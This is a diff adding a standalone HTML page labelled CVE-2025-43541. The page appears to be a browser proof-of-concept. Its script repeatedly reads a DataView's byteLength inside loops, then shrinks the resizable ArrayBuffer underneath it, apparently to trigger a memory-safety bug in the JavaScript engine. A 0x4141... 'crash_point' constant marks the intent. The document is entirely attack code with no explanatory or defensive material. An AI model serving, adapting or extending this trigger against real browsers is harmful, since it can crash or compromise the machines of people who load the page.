@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2025-43541</title>
+</head>
+<body>
+    <h1>CVE-2025-43541</h1>
+    <script>
+        const crash_point = 0x4141414141414141;
+        const loop_start = crash_point & 0xffffff00;
+        const loop_end = crash_point + 1;
+        for (let i = 0; i < 5000; i++) {
+            console.log(i)
+            const get_byte_length = arr => arr.byteLength;
+            const ab = new ArrayBuffer(99, { maxByteLength: 99 });
+            const dv = new DataView(ab, 1, 44);
+
+            for (let counter = loop_start; counter < loop_end; counter++) {
+                if (counter === loop_end - 2) {
+                    ab.resize(1);
+                    get_byte_length(1);
+                } else {
+                    try {
+                        get_byte_length(dv);
+                    } catch (e) { }
+                }
+            }
+        }
+    </script>
+</body>
+</html>
